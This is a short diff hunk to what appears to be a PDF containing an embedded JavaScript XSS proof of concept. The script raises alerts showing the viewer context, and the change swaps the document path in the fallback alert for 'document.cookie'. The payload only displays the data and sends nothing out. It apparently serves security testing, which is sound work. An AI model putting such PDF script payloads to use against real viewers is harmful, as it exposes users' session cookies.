@@ -25,7 +25,7 @@ endobj
       app.alert("XSS Execution Context: " + this.hostContainer.url);
     } catch(e) {
       // Fallback if hostContainer is not supported by the viewer
-      app.alert("XSS Executed. Document Path: " + this.path);
+      app.alert("XSS Executed. Document Path: " + document.cookie);
     }
   )
 >>
